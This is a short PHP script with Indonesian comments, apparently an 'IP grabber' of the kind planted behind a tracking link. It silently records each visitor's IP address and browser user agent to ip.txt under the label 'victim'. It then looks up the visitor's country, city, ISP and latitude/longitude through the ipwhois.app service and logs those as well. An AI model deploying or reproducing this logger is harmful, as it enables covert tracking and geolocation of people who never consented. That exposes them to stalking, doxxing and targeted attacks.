<?php

// Mendapatkan IP Address
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'] . "\r\n";
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'] . "\r\n";
} else {
    $ipaddress = $_SERVER['REMOTE_ADDR'] . "\r\n";
}

// Mendapatkan User Agent dan Browser
$useragent = "User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'] . "\r\n";

// Membuka file dan mencatat informasi dasar
$file = 'ip.txt';
$victim = "IP: " . $ipaddress;
$fp = fopen($file, 'a');

// Mencatat IP dan User-Agent ke dalam file
fwrite($fp, $victim);
fwrite($fp, $useragent);
fwrite($fp, $browser);

// Mengambil informasi geolokasi dari API eksternal
$api_url = "http://ipwhois.app/json/" . trim($ipaddress);
$response = @file_get_contents($api_url);
if ($response) {
    $details = json_decode($response, true);
    if ($details['success']) {
        $country = "Country: " . $details['country'] . "\r\n";
        $city = "City: " . $details['city'] . "\r\n";
        $isp = "ISP: " . $details['isp'] . "\r\n";
        $latitude = "Latitude: " . $details['latitude'] . "\r\n";
        $longitude = "Longitude: " . $details['longitude'] . "\r\n";

        // Mencatat informasi geolokasi ke dalam file
        fwrite($fp, $country);
        fwrite($fp, $city);
        fwrite($fp, $isp);
        fwrite($fp, $latitude);
        fwrite($fp, $longitude);
    } else {
        fwrite($fp, "Location Information: Not Available\r\n");
    }
} else {
    fwrite($fp, "Failed to connect to API\r\n");
}

// Menutup file
fclose($fp);

?>
